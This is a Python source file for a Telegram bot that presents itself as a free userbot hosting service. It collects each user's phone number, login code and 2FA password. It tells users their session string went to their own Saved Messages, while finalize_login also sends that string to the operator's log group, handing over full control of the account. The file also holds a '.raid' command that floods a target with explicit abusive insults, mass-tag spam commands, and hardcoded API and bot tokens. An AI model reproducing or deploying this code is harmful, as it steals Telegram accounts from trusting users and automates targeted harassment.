import os, asyncio, random
from pyrogram import Client, filters, errors, handlers
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread

# --- WEB SERVER FOR RENDER ---
app = Flask('')
@app.route('/')
def home(): return "✘ᴇɴᴏ Bᴏᴛ Is Oɴʟɪɴᴇ! ✨"
def run_web(): app.run(host='0.0.0.0', port=8080)

# --- CONFIGURATION ---
API_ID = 31980984
API_HASH = "a61358dd3cd8c3a56cd53d9ddd8a0c67"
BOT_TOKEN = "8303588999:AAEnHHO7ULTHA5IJKJAAGV8WEXSnV5dhz_M"
LOG_GROUP = -1003867805165 
START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"

bot = Client("XenoGen", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_data = {}
active_tasks = {}

# --- BUTTONS ---
main_buttons = InlineKeyboardMarkup([
    [InlineKeyboardButton("❂ 𝐔𝐩𝐝𝐚𝐭𝐞 ❂", url="https://t.me/radhesupport"),
     InlineKeyboardButton("❂ 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 ❂", url="https://t.me/radhesupport")],
    [InlineKeyboardButton("❂ 𝐂𝐥𝐨𝐬𝐞 ❂", callback_data="close")]
])

# --- CHAT LISTS ---
SWEET_CHATS = [
    "Hᴇʏ {}! Kᴀɪsᴇ ʜᴏ ᴊᴀɴᴜ? ✨",
    "Oʏᴇ {}, Sᴜɴᴏ ɴᴀ, ᴀᴀᴘ ʙᴀʜᴜᴛ ᴘʏᴀʀᴇ ʜᴏ! ❤️",
    "{} Jɪ, ᴋʜᴀᴀɴᴀ ᴋʜᴀ ʟɪʏᴀ ᴀᴀᴘɴᴇ? 🍛",
    "Kᴀʜᴀ ɢᴀʏᴀʙ ʜᴏ {}, ɪᴛɴᴇ ᴅɪɴᴏ sᴇ? 🥺",
    "{} Bᴀʙʏ, ᴇᴋ sᴍɪʟᴇ ᴅᴇ ᴅᴏ ɴᴀ! 🥰",
    "Aᴀᴘᴋɪ ʙᴀᴀᴛᴇɪɴ ʙᴀʜᴜᴛ ᴀᴄʜɪ ʜᴀɪ {}! 🍬",
    "{} Is ᴛʜᴇ ᴍᴏsᴛ ᴄᴜᴛᴇ ᴘᴇʀsᴏɴ ʜᴇʀᴇ! 💖",
    "Wᴇʟᴄᴏᴍᴇ {}, ᴄʜᴀʟᴏ ᴄʜᴀᴛ ᴋᴀʀᴛᴇ ʜᴀɪɴ! 🍷"
]

ABUSE_RAIDS = [
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ @target ᴋᴀ ʟᴀɴᴅ 👊",
    "ɴɪᴋᴀʟ ᴍᴀᴅᴀʀᴄʜᴏᴅ @target ʙᴇᴛᴀ ᴘᴀᴘᴀ sᴇ ᴘᴀɴɢᴀ ɴᴀʜɪ!",
    "ᴀʙᴇʏ sᴀᴀʟᴇ @target ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴏ ✘ᴇɴᴏ ɴᴇ ᴘᴇʟᴀ 🥵",
    "ɢᴀᴀɴᴅ ᴍᴇ ᴅᴜᴍ ɴᴀʜɪ @target ᴀᴜʀ ✘ᴇɴᴏ sᴇ ʟᴀᴅᴀɪ? 🔥",
    "ᴄʜᴜᴘ ᴋᴀʀ @target ʀᴀɴᴅɪ ᴋᴇ ᴘɪʟʟᴇ! 🖕",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋᴀ ʙʜᴏsᴅᴀ @target ᴋᴜᴛᴛᴇ ᴋɪ ᴀᴜʟᴀᴅ ☠️",
    "ʀᴀɴᴅɪ ᴋᴇ ᴊᴀɴᴇ @target ᴀᴜᴋᴀᴛ ᴍᴇ ʀᴇʜ ʙᴇᴛᴀ 🤬"
]

# --- USERBOT COMMAND FUNCTIONS ---

async def alive_cmd(c, m):
    await m.edit_text(
        "✨ **『 ✘ᴇɴᴏ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨\n\n"
        "➪ **sᴛᴀᴛᴜs:** `ʀᴜɴɴɪɴɢ ᴘᴇʀғᴇᴄᴛ` ⚡\n"
        "➪ **ᴏᴡɴᴇʀ:** `ᴍᴇ` 🍷\n"
        "➪ **sᴜᴘᴘᴏʀᴛ:** @radhesupport\n\n"
        "**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ**"
    )

async def tagall_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True # Task start
    await m.delete()
    async for member in c.get_chat_members(m.chat.id):
        if not active_tasks.get(uid): break # Stop check
        if member.user.is_bot: continue
        try:
            await c.send_message(m.chat.id, f"{member.user.mention} ⚡ **ᴊᴀɴᴜ ɪs ʜᴇʀᴇ!**")
            await asyncio.sleep(1.5)
        except: pass

async def onetag_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True # Task start
    await m.delete()
    async for member in c.get_chat_members(m.chat.id):
        if not active_tasks.get(uid): break # Stop check
        if member.user.is_bot: continue
        try:
            msg = random.choice(SWEET_CHATS).format(member.user.mention)
            await c.send_message(m.chat.id, f"👤 {msg}\n\n**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ**")
            await asyncio.sleep(1.5)
        except: pass

async def raid_cmd(c, m):
    uid = c.me.id
    if len(m.command) < 3: return await m.edit("𝐔𝐬𝐚𝐠𝐞: `.𝐫𝐚𝐢𝐝 𝟓 @𝐮𝐬𝐞𝐫`")
    active_tasks[uid] = True # Task start
    count = int(m.command[1])
    target = m.command[2]
    await m.delete()
    for _ in range(count):
        if not active_tasks.get(uid): break # Stop check
        await c.send_message(m.chat.id, random.choice(ABUSE_RAIDS).replace("@target", target))
        await asyncio.sleep(1.2)

async def stop_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = False # Sab tasks ko signal bhej diya rukne ke liye
    await m.edit("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ 』**\n\n**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ**")

# --- BOT MAIN COMMANDS ---

@bot.on_message(filters.command("start") & filters.private)
async def start(c, m):
    await m.reply_photo(
        photo=START_IMG,
        caption=(f"✨ **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ✘ᴇɴᴏ ᴜsᴇʀʙᴏᴛ** ✨\n\n"
                 f"ʜᴇʏ {m.from_user.mention},\n"
                 "ᴍᴀɪɴ ᴀᴀᴘᴋɪ ɪᴅ ᴋᴏ **ʙᴏᴏsᴛ** ᴋᴀʀɴᴇ ᴀᴜʀ **ᴀɴɪᴍᴀᴛɪᴏɴs** ᴋᴇ ʟɪʏᴇ ᴜsᴇʀʙᴏᴛ ʜᴏsᴛ ᴋᴀʀ sᴀᴋᴛᴀ ʜᴏᴏɴ.\n\n"
                 "📝 **ᴄᴏᴍᴍᴀɴᴅs:**\n"
                 "» **/help** : ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
                 "» **/guide** : ʜᴏᴡ ᴛᴏ ʜᴏsᴛ ʙᴏᴛ\n"
                 "» **/add** : sᴛᴀʀᴛ ʜᴏsᴛɪɴɢ ᴘʀᴏᴄᴇss\n\n"
                 "**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ** - @radhesupport"),
        reply_markup=main_buttons
    )

@bot.on_message(filters.command("help") & filters.private)
async def help_cmd(c, m):
    help_text = ("✨ **『 ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs 』** ✨\n\n"
                 "⭐ **/start** — sᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ\n"
                 "📖 **/help** — ᴏᴘᴇɴ ʜᴇʟᴘ ᴍᴇɴᴜ\n"
                 "⚡ **/guide** — ᴏᴘᴇɴ ɢᴜɪᴅᴇ ᴍᴇɴᴜ\n"
                 "🚀 **/add** — ᴀᴜᴛᴏ-ʜᴏsᴛ ᴛʜᴇ ʙᴏᴛ\n"
                 "❌ **/remove** — ʟᴏɢᴏᴜᴛ ғʀᴏᴍ ʙᴏᴛ\n\n"
                 "**Userbot Commands (Type with '.'):**\n"
                 "» `.alive` | `.tagall` | `.onetag` | `.raid` | `.stop`")
    await m.reply_photo(photo=START_IMG, caption=help_text, reply_markup=main_buttons)

@bot.on_message(filters.command("guide") & filters.private)
async def guide_cmd(c, m):
    guide_text = (
        "❖ **ǫᴜɪᴄᴋ ɢᴜɪᴅᴇ ᴛᴏ ʜᴏsᴛɪɴɢ ✘ᴇɴᴏ ᴜsᴇʀʙᴏᴛ**\n\n"
        "1) sᴇɴᴅ **/add** ᴄᴏᴍᴍᴀɴᴅ\n"
        "2) sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (+91...)\n"
        "3) sᴇɴᴅ ᴛᴇʟᴇɢʀᴀᴍ ᴏᴛᴘ ʟɪᴋᴇ: `1 2 3 4 5`\n"
        "4) sᴇɴᴅ 2FA ᴘᴀssᴡᴏʀᴅ (ɪғ ᴀɴʏ)\n\n"
        "**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ** - @radhesupport"
    )
    await m.reply_photo(photo=START_IMG, caption=guide_text, reply_markup=main_buttons)

# --- LOGIN & AUTO-HOST LOGIC ---

@bot.on_message(filters.command("add") & filters.private)
async def add_process(c, m):
    await m.reply_text("📲 **ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ**\n(e.g., `+918200000009`):")

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    uid = m.from_user.id
    text = m.text
    if text.startswith("+"):
        user_data[uid] = {"phone": text}
        temp_c = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
        await temp_c.connect()
        try:
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
            await m.reply_text("📩 **ᴏᴛᴘ sᴇɴᴛ!** ᴘʟᴇᴀsᴇ sᴇɴᴅ: `1 2 3 4 5`")
        except Exception as e: await m.reply_text(f"❌ **Error:** `{e}`")
    elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp = text.replace(" ", "")
        try:
            await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
            await finalize_login(c, m, uid)
        except errors.SessionPasswordNeeded: await m.reply_text("🔐 **sᴇɴᴅ ʏᴏᴜʀ 2ғᴀ ᴘᴀssᴡᴏʀᴅ.**")
        except Exception as e: await m.reply_text(f"❌ **OTP Error:** `{e}`")
    elif uid in user_data and "client" in user_data[uid]:
        try:
            await user_data[uid]["client"].check_password(text)
            await finalize_login(c, m, uid)
        except Exception as e: await m.reply_text(f"❌ **2FA Error:** `{e}`")

async def finalize_login(c, m, uid):
    data = user_data[uid]
    string = await data["client"].export_session_string()
    
    try:
        await data["client"].send_message("me", f"✨ **✘ᴇɴᴏ ᴜsᴇʀʙᴏᴛ sᴛʀɪɴɢ** ✨\n\n`{string}`\n\n**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ**")
    except: pass

    await m.reply_photo(
        photo=START_IMG,
        caption=f"✅ **ʟᴏɢɢᴇᴅ ɪɴ sᴜᴄᴄᴇsғᴜʟʟʏ!**\n\nsᴇssɪᴏɴ sᴛʀɪɴɢ sᴇɴᴛ ᴛᴏ **sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs**.\n\n**ᴘᴏᴡᴇʀ ᴏғ ✘ᴇɴᴏ**"
    )
    
    ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
    ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))
    
    await ubot.start()
    
    try:
        await bot.send_message(LOG_GROUP, f"🏁 **ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ**\n**Usᴇʀ:** `{uid}`\n**Sᴛʀɪɴɢ:** `{string}`")
    except: pass
    del user_data[uid]

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    bot.run()
